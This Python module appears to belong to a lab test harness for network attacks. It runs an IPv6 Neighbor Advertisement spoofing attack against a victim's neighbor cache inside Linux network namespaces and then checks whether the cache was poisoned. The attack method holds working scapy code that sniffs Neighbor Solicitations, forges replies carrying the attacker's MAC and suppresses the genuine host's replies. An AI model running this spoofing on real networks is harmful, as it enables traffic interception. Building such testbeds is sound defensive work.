import time
import subprocess
import netns
import scapy.all as scapy
from lib.connectivity import *
from pyroute2 import IPRoute
import iptc

from attacks.attack import Attack

class NDNASpoofing(Attack):
    """
    This Attack is spoofing a IPv6 Neighbor Advertisement
    """

    def __init__(self, config: dict, interfaces: list[scapy.NetworkInterface], ip4network: ipaddress.IPv4Network):
        super().__init__(config, interfaces, ip4network)
        self.victim_host_num = 1
        self.attack_host_num = 0
        self.destination_host_num = 2
        self.victim_interface = self.interfaces[self.victim_host_num]
        self.attack_interface = self.interfaces[self.attack_host_num]
        self.destination_interface = self.interfaces[self.destination_host_num]
        self.na_spoofer = None
        self.ping6_spoofer = None

    def setup(self):
        ans = icmping6(self.interfaces, self.victim_host_num, self.destination_interface.ips[6][0], count=1)
        if len(ans.res) != 1:
            raise RuntimeError("No connectivity to destination host.")
        ans = icmping6(self.interfaces, self.victim_host_num, self.attack_interface.ips[6][0], count=1)
        if len(ans.res) != 1:
            raise RuntimeError("No connectivity to attacker host.")

        time.sleep(6)

        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
            ipr = IPRoute()
            cache = ipr.get_neighbours(dst=self.destination_interface.ips[6][0], lladdr=self.destination_interface.mac)
            if len(cache) == 0:
                raise RuntimeError("Neighbor table empty.")

    def attack(self):
        def is_request(req):
            """
            Check if packet req is a ND request
            Adapted from scapy.layers.inet6
            """

            # Those simple checks are based on Section 5.4.2 of RFC 4862
            if not (scapy.Ether in req and scapy.IPv6 in req and scapy.ICMPv6ND_NS in req):
                return 0

            # Source must NOT be the unspecified address
            if req[scapy.IPv6].src == "::":
                return 0

            return 1

        def reply_callback(req):
            """
            Callback that reply to a NS with a spoofed NA
            Adapted from scapy.layers.inet6
            """

            # Let's build a reply (as defined in Section 7.2.4. of RFC 4861) and
            # send it back.
            reply_mac = self.interfaces[self.attack_host_num].mac
            mac = req[scapy.Ether].src
            pkt = req[scapy.IPv6]
            src = pkt.src
            tgt = req[scapy.ICMPv6ND_NS].tgt
            rep = scapy.Ether(src=reply_mac, dst=mac) / scapy.IPv6(src=tgt, dst=src)
            # Use the target field from the NS
            rep /= scapy.ICMPv6ND_NA(tgt=tgt, S=1, R=0, O=1)  # noqa: E741

            # "If the solicitation IP Destination Address is not a multicast
            # address, the Target Link-Layer Address option MAY be omitted"
            # Given our purpose, we always include it.
            rep /= scapy.ICMPv6NDOptDstLLAddr(lladdr=reply_mac)

            with netns.NetNS(nsname=f'host{self.attack_host_num}'):
                scapy.sendp(rep, iface=self.interfaces[self.attack_host_num], verbose=0)

        sniff_filter = f"icmp6 and ether src {self.victim_interface.mac}"
        self.na_spoofer = get_async_sniffer(self.interfaces,
                                    self.attack_host_num,
                                    filterstr=sniff_filter,
                                    lfilter=is_request,
                                    prn=reply_callback)
        self.na_spoofer.start()

        # Prevent kernel from sending NA, because it is too fast compared to scapy
        with netns.NetNS(nsname=f'host{self.destination_host_num}'):
            rule = {'protocol': 'icmpv6', 'icmp6': {'icmpv6-type': 'neighbour-advertisement'}, 'target': 'DROP'}
            iptc.easy.insert_rule('filter', 'OUTPUT', rule, ipv6=True)

        with netns.NetNS(nsname=f'host{self.attack_host_num}'):
            self.ping6_spoofer = ICMP6Echo_am(interface=self.attack_interface)
            self.ping6_spoofer(bg=True)

        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
            ipr = IPRoute()
            ipr.neigh('del',dst=self.destination_interface.ips[6][0], ifindex=self.victim_interface.index)

        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
            subprocess.run(['ping', '-c', '3', f'{self.destination_interface.ips[6][0]}'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)


    def result(self) -> bool:
        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
            ipr = IPRoute()
            cache = ipr.get_neighbours(dst=self.destination_interface.ips[6][0],
                                       lladdr=self.attack_interface.mac)

            if len(cache) > 0:
                return True
            else:
                return False

    def cleanup(self):
        self.na_spoofer.stop()
        self.ping6_spoofer.sniffer.stop()

        with netns.NetNS(nsname=f'host{self.destination_host_num}'):
            iptc.easy.flush_all(ipv6=True)

        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
            ipr = IPRoute()
            ipr.neigh('del',dst=self.destination_interface.ips[6][0], ifindex=self.victim_interface.index)

    def run(self) -> bool:
        self.setup()
        self.attack()
        res = self.result()
        self.cleanup()

        return res
